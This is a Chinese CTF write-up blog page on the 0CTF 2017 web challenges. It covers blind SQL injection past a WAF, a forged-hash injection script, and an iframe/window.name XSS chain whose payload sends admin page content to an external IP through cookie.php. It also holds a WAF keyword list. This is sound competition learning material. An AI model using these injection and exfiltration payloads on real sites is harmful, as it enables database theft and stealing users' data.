<!DOCTYPE html>

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
<title>0CTF2017|Web – Wupco's Blog</title>
<script src="./0CTF2017Web – Wupco's Blog/jquery.jsver=1.12.4" type="text/javascript"></script>
<script src="./0CTF2017Web – Wupco's Blog/jquery-migrate.min.jsver=1.4.1" type="text/javascript"></script>
<link href="./0CTF2017Web – Wupco's Blog/rest_route=" rel="https://api.w.org/"/>
<link href="http://www.wupco.cn/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
<link href="./0CTF2017Web – Wupco's Blog/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
<link href="./0CTF2017Web – Wupco's Blog/p=2169" rel="prev" title="NJCTF2017-Web"/>
<link href="./0CTF2017Web – Wupco's Blog/p=3455" rel="next" title="ssctf2017|Web"/>
<link href="./0CTF2017Web – Wupco's Blog/p=2554" rel="canonical"/>
<link href="./0CTF2017Web – Wupco's Blog/p=2554" rel="shortlink"/>
<script src="./0CTF2017Web – Wupco's Blog/shCore.js" type="text/javascript"></script><link href=" http://www.wupco.cn/wp-content/plugins/wp-ueditor2/ueditor/third-party/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css"/><link href="./0CTF2017Web – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="32x32"/>
<link href="./0CTF2017Web – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="192x192"/>
<link href="./0CTF2017Web – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="apple-touch-icon-precomposed"/>
<meta content="http://www.wupco.cn/wp-content/uploads/2016/11/R5K8RH7ACHA7KEV8P.gif" name="msapplication-TileImage">
<link href="./0CTF2017Web – Wupco's Blog/favicon.png" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
<link href="./0CTF2017Web – Wupco's Blog/style.css" rel="stylesheet" type="text/css">
<!--[if lt IE 9]>
<script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script>
<script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</link></meta></head>
<body>
<div class="container" id="main">
<div class="pjax">
<header id="header">
<div class="container">
<h1 class="logo">
<i class="iconfont"></i><a href="http://www.wupco.cn">Wupco's Blog</a>
</h1>
<nav class="menu_click" id="topMenu">
<div class="menu-menu-1-container"><ul class="menu" id="menu-menu-1"><li><a href="http://www.wupco.cn/">首页</a></li>
<li><a href="http://www.wupco.cn/?page_id=1174">关于我</a></li>
<li><a href="http://www.wupco.cn/?page_id=1448">数据备份</a></li>
<li><a href="http://www.wupco.cn/?page_id=1959">CTF备忘录</a></li>
</ul></div><i class="i_1"></i>
<i class="i_2"></i>
</nav>
</div>
</header>
<section class="blockGroup">
<h2 class="s_title" itemprop="name headline">0CTF2017|Web</h2>
<article class="post single" itemscope="" itemtype="http://schema.org/BlogPosting">
<blockquote><p>这次0ctf Web题目很耐做，尤其是两道XSS，让我学到了很多东西，（虽然没做出来），那两道之后会详细分析，现在先放出剩下三道题的做题思路。</p>
</blockquote>
<h1><span style='color: rgb(67, 67, 67); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 24px;'>Temmo's Tiny Shop</span></h1>
<p><span style='color: rgb(67, 67, 67); vertical-align: baseline; white-space: pre-wrap; font-size: 16px; font-family: 微软雅黑, "Microsoft YaHei";'>比赛一开始好像出了bug，钱可以无限制的增长，随手买了hint（官方马上改了）<br/></span></p>
<p><span style='color: rgb(67, 67, 67); vertical-align: baseline; white-space: pre-wrap; font-size: 16px; font-family: 微软雅黑, "Microsoft YaHei";'>这两个hint至关重要，第一个就是告诉了表名，第二个也是找到注入点的关键条件。</span></p>
<p><span style="vertical-align: baseline; white-space: pre-wrap; color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt;"><br/></span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt; line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"> OK! Now I will give some hint: you can get flag by use `select flag from b7d8769d64997e392747dbad9cd450c4` </span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt; line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">2017-03-18 09:24:18 --- !HINT! </span></p>
<p><span style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt;"><br/></span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt; line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">Round off your meal with a salty brownie and a cup of locally roasted coffee at Baked, maybe you will get flag </span></p>
<p style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt;"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><br/></span></p>
<p style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt;"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">在购买了brownie和cat之后，会发现order 字段存在注入（别问为什么买这两个，这就是运气）<br/></span></p>
<p style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14pt;"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img src="./0CTF2017Web – Wupco's Blog/50211490084059.png"/></span></p>
<p style="color: rgb(67, 67, 67); font-family: Arial;"><span style="font-size: 14.6667px;">WAF过滤了一大堆字符</span></p>
<p><span id="docs-internal-guid-cedcf620-efc2-c078-024c-c7e844ada457"></span></p>
<pre class="brush:php;toolbar:false" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14.6667px;">|
'
"
;
&gt;
&lt;
*
$
!
`
%09
%0A
%0B
%0C
%0D
%20
+
=
rand
extractvalue
information_schema
updatexml</pre>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14.6667px; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style='font-size: 10pt; background-color: rgb(245, 245, 245); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; color: rgb(0, 0, 0);'></span>之后查到 order后可以用if进行盲注</p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14.6667px; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><img src="./0CTF2017Web – Wupco's Blog/64051490084059.png"/></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14.6667px; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">构造payload</p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14.6667px; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span id="docs-internal-guid-cedcf620-efc4-fe24-362d-a1a74d07e90f" style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">if(ascii(substr((select(flag)from(b7d8769d64997e392747dbad9cd450c4)),1,1))like(1),name,price)</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px;">试了一天都不对。</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px;">后来考虑到是hint做了修改，表名也改了。</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px;">于是准备竞争漏洞买hint。。</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px;">但是还是不行。。各种买，卖竞争都有试过。</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px;">第二天早上开始找脑洞，注意到一个hint是</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-family: Arial; white-space: pre-wrap; font-size: 14.6667px; color: rgb(84, 141, 212);">and a cup of locally roasted coffee at Baked</span></p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">网上翻了一下，发现星巴克爆出过 session竞争漏洞。</p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">于是开了两个浏览器登陆同一个号，抓取session，进行竞争，拿到hint</p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><img src="./0CTF2017Web – Wupco's Blog/94381490084059.png"/></p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span id="docs-internal-guid-cedcf620-efc8-5060-10f5-07d34b70ed51" style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">OK! Now I will give some hint: you can get flag by use `select flag from ce63e444b0d049e9c899c9a0336b3c59`    </span></p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">然后是盲注 拿到flag</p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span id="docs-internal-guid-cedcf620-efca-9ff7-aeaa-15cce577d87c" style="font-size: 11pt; font-family: Arial; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">flag{r4ce_c0nditi0n_i5_excited}</span></p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 11pt; font-family: Arial; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><br/></span></p>
<h1 dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style='font-weight: 700; color: rgb(67, 67, 67); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 24px;'>KoG</span></h1>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">根据输入的id，js算出来hash，然后提交到一个api</p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span id="docs-internal-guid-cedcf620-efcb-fac8-5e45-3e508b51008c"><span style="font-size: 11pt; font-family: Arial; color: rgb(186, 33, 33); background-color: rgb(248, 248, 248); vertical-align: baseline; white-space: pre-wrap;">api.php?time=&amp;hash=&amp;id=</span><span style="font-size: 11pt; font-family: Arial; background-color: rgb(248, 248, 248); vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break"/></span></span></p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">很容易看出是一个注入，首要的问题是如何算出hash(如果直接输入1'这种注入语句会被拦截)</p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">用firebug单步调试</p>
<p dir="ltr" style="font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">看到main()函数</p>
<pre class="brush:js;toolbar:false">Module.main
(function(throwBindingError,invoker,fn,runDestructors,retType,classParam,argType0,arg0Wired_dtor
/*``*/) {
return function main(arg0) {
if (arguments.length !== 1) {
throwBindingError('function main called with ' + arguments.length + ' arguments, expected 1 args!');
}
var arg0Wired = argType0.toWireType(null, arg0); // std::string
var rv = invoker(fn, arg0Wired);
arg0Wired_dtor(arg0Wired); // std::string
var ret = retType.fromWireType(rv);
return ret;
}

})</pre>
<p> 把相关函数源码通过单步拿到</p>
<pre class="brush:js;toolbar:false">     function(destructors, value) {
              if (value instanceof ArrayBuffer) {
                  value = new Uint8Array(value);
              }
  
              function getTAElement(ta, index) {
                  return ta[index];
              }
              function getStringElement(string, index) {
                  return string.charCodeAt(index);
              }
              var getElement;
              if (value instanceof Uint8Array) {
                  getElement = getTAElement;
              } else if (value instanceof Int8Array) {
                  getElement = getTAElement;
              } else if (typeof value === 'string') {
                  getElement = getStringElement;
              } else {
                  throwBindingError('Cannot pass non-string to std::string');
              }
  
              // assumes 4-byte alignment
              var length = value.length;
              var ptr = _malloc(4 + length);
              HEAPU32[ptr &gt;&gt; 2] = length;
              for (var i = 0; i &lt; length; ++i) {
                  var charCode = getElement(value, i);
                  if (charCode &gt; 255) {
                      _free(ptr);
                      throwBindingError('String has UTF-16 code units that do not fit in 8 bits');
                  }
                  HEAPU8[ptr + 4 + i] = charCode;
              }
              if (destructors !== null) {
                  destructors.push(_free, ptr);
              }
              return ptr;
          },


 function _time(ptr) {
      var ret = (Date.now()/1000)|0;
      if (ptr) {
        HEAP32[((ptr)&gt;&gt;2)]=ret;
      }
      return ret;
    }

function(value) {
              var length = HEAPU32[value &gt;&gt; 2];
              var a = new Array(length);
              for (var i = 0; i &lt; length; ++i) {
                  a[i] = String.fromCharCode(HEAPU8[value + 4 + i]);
              }
              _free(value);
              return a.join('');
          },</pre>
<p></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; font-size: 14.6667px; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;">可以看到他是直接利用BUFFER，在BUFFER里进行运算<br/><span id="docs-internal-guid-cedcf620-efcf-fa5c-6e19-1d8b4e99e27b" style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">HEAPU里面存储着数据</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px; white-space: pre-wrap;">在firebug里面单步执行到最后一步获得结果前，输入一个小于原来参数的值</span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px; white-space: pre-wrap;"><img src="./0CTF2017Web – Wupco's Blog/30811490084059.png"/></span></p>
<p dir="ltr" style="color: rgb(67, 67, 67); font-family: Arial; line-height: 1.8; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-size: 14.6667px; white-space: pre-wrap;">就会dump下来内存</span></p>
<p>找到加密原文</p>
<p><img src="./0CTF2017Web – Wupco's Blog/30771490084059.png"/></p>
<p><span id="docs-internal-guid-cedcf620-efd2-29df-f60a-843af4e66b2b" style="font-size: 11pt; font-family: Arial; color: rgb(186, 33, 33); background-color: rgb(248, 248, 248); vertical-align: baseline; white-space: pre-wrap;">d727d11f6d284a0d+payload+ This_is_salt+时间戳</span></p>
<p>整个原文进行md5就是hash值，接下来就可以写脚本注入来获取flag</p>
<pre class="brush:python;toolbar:false">import time
import hashlib   
import requests
def md5(src):
    m2 = hashlib.md5()   
    m2.update(src)   
    return m2.hexdigest()
#payload = "-1 union select 1,column_name from information_schema.columns where TABLE_NAME='fl4g' limit 0,1"
payload = "-1 union select 1,hey from 0ctf.fl4g"
hash = md5('d727d11f6d284a0dpayload This_is_salt1489821845'.replace('payload', payload))
id = payload
url = 'http://202.120.7.213:11181/api.php?time=1489821845'+'&amp;hash='+hash+'&amp;id='+id
print url
r = requests.get(url)
print r.text</pre>
<p><span id="docs-internal-guid-cedcf620-efd5-6194-6ccb-3c2590befbe6" style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">flag{emScripten_is_Cut3_right?}</span></p>
<h1><span style='vertical-align: baseline; white-space: pre-wrap; font-size: 24px; font-family: 微软雅黑, "Microsoft YaHei";'>SIMPLESQLi</span><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><br/></span></h1>
<p>一个注入，ascii码大于一定值会被过滤掉，于是就用它来绕过WAF对select等关键词的拦截。</p>
<p></p>
<h1><span style='font-family: 微软雅黑, "Microsoft YaHei";'>complicated xss </span></h1>
<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><img src="./0CTF2017Web – Wupco's Blog/63241490084059.png"/></span></p>
<p></p>
<p><span style="font-family:'Arial Unicode MS'">在</span><a href="http://government.vip/"><span style="color:#1155CC">http://government.vip/</span></a><span style="font-family:'Arial Unicode MS'">可以构造任意html让bot点击，但是因为同源策略不能ajax访问http://admin.goverment.vip:8000/ 的内容</span></p>
<p><span style="font-family:'Arial Unicode MS'">http://admin.goverment.vip:8000/ 里面有登陆/上传功能</span></p>
<p> </p>
<p><span style="font-family:'Arial Unicode MS'">具体信息如下：</span></p>
<p> </p>
<p><img src="./0CTF2017Web – Wupco's Blog/3871490084059.png"/></p>
<p><span style="font-family:'Arial Unicode MS'">可构造任意html让bot点击</span></p>
<p><img src="./0CTF2017Web – Wupco's Blog/48481490084060.png"/></p>
<p><span style="font-family:'Arial Unicode MS'">这里应该可以admin传shell??不知道字段orz</span></p>
<p><a href="http://admin.government.vip:8000/upload"><span style="color:#1155CC">http://admin.government.vip:8000/upload</span></a></p>
<p></p>
<p><span style="color:#1155CC"><a href="http://admin.government.vip:8000/login">http://admin.government.vip:8000/login</a></span></p>
<p><span style="font-family:'Arial Unicode MS'">test /test 登陆(没有csrf保护)</span></p>
<p> </p>
<p><span style="color:#1155CC"><a href="http://admin.government.vip:8000/">http://admin.government.vip:8000</a></span></p>
<p><span style="font-family:'Arial Unicode MS'">存在self-xss(cookie中username可构造payload)，但删除了一些window的函数</span></p>
<pre class="brush:js;toolbar:false">delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;</pre>
<p><a href="http://admin.government.vip:8000/"><span style="color:#1155CC">http://admin.government.vip:8000</span></a></p>
<p><span style="font-family:'Arial Unicode MS'">有同源策略保护</span></p>
<p><span style="font-family:'Arial Unicode MS'">不能从</span><a href="http://government.vip/"><span style="color:#1155CC">http://government.vip/</span></a></p>
<p><span style="font-family:'Arial Unicode MS'">直接ajax访问</span></p>
<p></p>
<p>思路：</p>
<p></p>
<p><span style="font-family:'Arial Unicode MS'">初步想法是先篡改子域的cookie，构造iframe，进行self-xss，利用window.name进行通讯</span></p>
<p><span style="font-family:'Arial Unicode MS'"><br/></span></p>
<p><span style="font-family:'Arial Unicode MS'">构造出payload：</span></p>
<pre class="brush:html;toolbar:false"> &lt;HTML&gt;
&lt;HEAD&gt;
&lt;script src=http://webxss.net/5drXyH?1489843913&gt;&lt;/script&gt;
&lt;script&gt;
document.cookie = 'username=&lt;\/h1&gt;test&lt;img src="#" onerror="window.name=document.body.innerHTML"&gt;;domain=.government.vip; path=/';
&lt;/script&gt;
&lt;/HEAD&gt;
&lt;BODY&gt;
&lt;script&gt;
      var state=0;
    iframe = document.createElement('iframe'),
    loadfn = function() {
     
     if (state === 1) {
            var data = iframe.contentWindow.name;
            window.open("http://123.206.216.198/cookie.php?msg="+escape(data));
        } else if (state === 0) {
            state = 1;
            iframe.contentWindow.location = "http://government.vip/data/50856607eadd5182d6dcd046531211d1.html";
        }
    
       
    };
    iframe.src = 'http://admin.government.vip:8000/';
    if (iframe.attachEvent) {
        iframe.attachEvent('onload', loadfn);
    } else {
        iframe.onload  = loadfn;
    }
    document.body.appendChild(iframe);&lt;/script&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;</pre>
<p><span style="font-family:'Arial Unicode MS'"></span></p>
<p>成功打到admin访问的子域的页面内容</p>
<p></p>
<p><img src="./0CTF2017Web – Wupco's Blog/93211490084060.png"/></p>
<p></p>
<p>然后看到这里面沙盒删除了很多个该window下的函数，就放弃使用ajax获取数据了，</p>
<p>想要构造一个自动提交的表单，但是不知道怎么填充默认文件内容，也试过文件名XSS..都无果</p>
<p></p>
<p>今天翻看了一下别人的wp</p>
<p><a _src="http://blog.dragonsector.pl/2017/03/0ctf-2017-complicated-xss-web-177.html" href="http://blog.dragonsector.pl/2017/03/0ctf-2017-complicated-xss-web-177.html">http://blog.dragonsector.pl/2017/03/0ctf-2017-complicated-xss-web-177.html</a></p>
<p>发现是利用创建一个到upload 的iframe，然后利用这个iframe window的XMLHttpRequest进行数据传输（没想到iframe就是另外一个window，不受沙盒影响，学习到了一波姿势。。。）</p>
<p></p>
<p><img src="./0CTF2017Web – Wupco's Blog/35311490084060.png"/></p>
<p>这里构造了上传内容</p>
<p>最后是上传过后直接返回的flag</p>
<p></p>
<h1><span style='font-family: 微软雅黑, "Microsoft YaHei"; font-size: 24px;'>simple xss</span></h1>
<p><span style="font-family:微软雅黑, Microsoft YaHei">很迷的题。。可以使用的字符有</span></p>
<p><span style="font-family:微软雅黑, Microsoft YaHei"><code>a-zA-Z ~|_^\=&lt;-+*</code></span></p>
<p><span style="font-family:monospace">试了一下</span></p>
<p><span style="font-family:monospace">&lt;script src=\\xxxxxx</span></p>
<p><span style="font-family:monospace">发现是个<a _src="http://file://协议的的url" href="http://file://协议的的url">file://协议的的url</a> </span></p>
<p>然后查了一波姿势</p>
<p>构造出</p>
<p>&lt;img src=1 onerror=loaction=（任意一个document下的变量）</p>
<p>但是没什么效果。。。</p>
<p></p>
<p>今天，看了LC BC的WP</p>
<p><a _src="https://ctftime.org/writeup/5956" href="https://ctftime.org/writeup/5956">https://ctftime.org/writeup/5956</a> </p>
<p></p>
<p><img src="./0CTF2017Web – Wupco's Blog/77061490084060.png"/></p>
<p>\\居然会解析到<span id="_baidu_bookmark_start_41" style="display: none; line-height: 0px;">‍</span><a _src="https://协议" href="https://协议">https://</a>   协议  很费解。。。。</p>
<p>自己复现了也还是file。。。不知道为什么。。</p>
<p>所以等我再研究一下。。。</p>
<p>= =原来是因为在win下\\会自动被解析成file协议。。。。。很烦。。我想买MAC了。。。</p>
<p>然后在chrome下 可以用句号。代替.</p>
<p>这样就可以构造payload了~</p>
<p></p>
<p></p>
<p></p>
</article>
<section class="ending">
<ul class="sns">
<li class="tencent"><a href="http://wpa.qq.com/msgrd?v=3&amp;uin=827977014&amp;site=qq&amp;menu=yes" target="_blank"><i class="iconfont"></i></a></li>
<li class="zhihu"><a href="https://www.zhihu.com/people/wupco " target="_blank"><i class="iconfont"></i></a></li>
</ul>
<div class="reward">
                打
                <ul>
<li><img src="./0CTF2017Web – Wupco's Blog/QQ图片20170222193616.png"/>用支付宝打我</li>
<li><img src="./0CTF2017Web – Wupco's Blog/QQ图片20170222193616.png"/>用微信打我</li>
</ul>
</div>
<div class="about">
<img alt="" class="avatar avatar-80 photo" height="80" src="./0CTF2017Web – Wupco's Blog/cd0d984309c15bd1f668df0d0343eccds=80&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/cd0d984309c15bd1f668df0d0343eccd?s=160&amp;d=mm&amp;r=g 2x" width="80"> <p></p>
</img></div>
</section>
<!-- You can start editing here. -->
<h3 id="comments">
		2条回应：“0CTF2017|Web”	</h3>
<div class="navigation">
<div class="alignleft"></div>
<div class="alignright"></div>
</div>
<ol class="commentlist">
<li class="comment even thread-even depth-1 parent" id="comment-14">
<div class="comment-body" id="div-comment-14">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-32 photo" height="32" src="./0CTF2017Web – Wupco's Blog/ad1882ae54081cf2526172e44d14784cs=32&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/ad1882ae54081cf2526172e44d14784c?s=64&amp;d=mm&amp;r=g 2x" width="32"> <cite class="fn">zzz</cite><span class="says">说道：</span> </img></div>
<div class="comment-meta commentmetadata"><a href="http://www.wupco.cn/?p=2554#comment-14">
			2017年3月21日 下午4:29</a> </div>
<p>那个真的不叫firebug……firebug是另外一个东西</p>
<div class="reply"><a aria-label="回复给zzz" class="comment-reply-link" href="http://www.wupco.cn/?p=2554&amp;replytocom=14#respond" onclick='return addComment.moveForm( "div-comment-14", "14", "respond", "2554" )' rel="nofollow">回复</a></div>
</div>
<ul class="children">
<li class="comment byuser comment-author-wupco bypostauthor odd alt depth-2" id="comment-15">
<div class="comment-body" id="div-comment-15">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-32 photo" height="32" src="./0CTF2017Web – Wupco's Blog/cd0d984309c15bd1f668df0d0343eccds=32&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/cd0d984309c15bd1f668df0d0343eccd?s=64&amp;d=mm&amp;r=g 2x" width="32"/> <cite class="fn">wupco</cite><span class="says">说道：</span> </div>
<div class="comment-meta commentmetadata"><a href="http://www.wupco.cn/?p=2554#comment-15">
			2017年3月21日 下午4:37</a> </div>
<p>@<a href="#comment-14">zzz</a> 23333…firefox ‘s debug tool 应该这么说。</p>
<div class="reply"><a aria-label="回复给wupco" class="comment-reply-link" href="http://www.wupco.cn/?p=2554&amp;replytocom=15#respond" onclick='return addComment.moveForm( "div-comment-15", "15", "respond", "2554" )' rel="nofollow">回复</a></div>
</div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ol>
<div class="navigation">
<div class="alignleft"></div>
<div class="alignright"></div>
</div>
<div class="comment-respond" id="respond">
<h3 class="comment-reply-title" id="reply-title">发表评论 <small><a href="/?p=2554#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">取消回复</a></small></h3> <form action="http://www.wupco.cn/wp-comments-post.php" class="comment-form" id="commentform" method="post">
<p class="comment-notes"><span id="email-notes">电子邮件地址不会被公开。</span> 必填项已用<span class="required">*</span>标注</p><p class="comment-form-comment"><label for="comment">评论</label> <textarea aria-required="true" cols="45" id="comment" maxlength="65525" name="w" required="required" rows="8"></textarea><textarea cols="100%" name="comment" rows="4" style="display:none"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input aria-required="true" id="author" maxlength="245" name="author" required="required" size="30" type="text" value=""/></p>
<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input aria-describedby="email-notes" aria-required="true" id="email" maxlength="100" name="email" required="required" size="30" type="text" value=""/></p>
<p class="comment-form-url"><label for="url">站点</label> <input id="url" maxlength="200" name="url" size="30" type="text" value=""/></p>
<p class="form-submit"><input class="submit" id="submit" name="submit" type="submit" value="发表评论"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="2554"/>
<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
</p> </form>
</div><!-- #respond -->
</section>
<div class="clearer"></div>
<nav class="navigator">
</nav>
</div>
</div>
<div class="clearer"></div>
<div class="search">
<form action="http://www.wupco.cn" method="get">
<input autocomplete="off" class="search_key" name="s" placeholder="Enter search keywords..." required="required" type="text" value=""/>
<button alt="Search" type="submit">Search</button>
</form>
</div>
<footer id="footer">
<section class="links_adlink">
<ul class="container">
</ul>
</section>
友情链接:<a href="http://www.hazzel.cn">Hazzel师傅</a> <a href="http://www.yqxiaojunjie.com/">俊杰师傅</a> <a href="http://margular.github.io">sunshine</a> <a href="https://3wapp.github.io/">janes师傅</a><br/> <a href="http://www.au1ge.xyz/">au1ge</a><br/>
© 2017 <a href="http://www.wupco.cn">Wupco's Blog</a>
<a class="back2top"></a>
</footer>
<script type="text/javascript">SyntaxHighlighter.all();</script><script type="text/javascript">
/* <![CDATA[ */
var ajaxcomment = {"ajax_url":"http:\/\/www.wupco.cn\/wp-admin\/admin-ajax.php","order":"asc","formpostion":"top"};
/* ]]> */
</script>
<script src="./0CTF2017Web – Wupco's Blog/app.jsver=20141010" type="text/javascript"></script>
<script style="display:none">
function index_overloaded(){

}
</script>
<script src="./0CTF2017Web – Wupco's Blog/jquery.min.js"></script>
<script src="./0CTF2017Web – Wupco's Blog/functions.js"></script>
<script>
</script>
</body>
</html>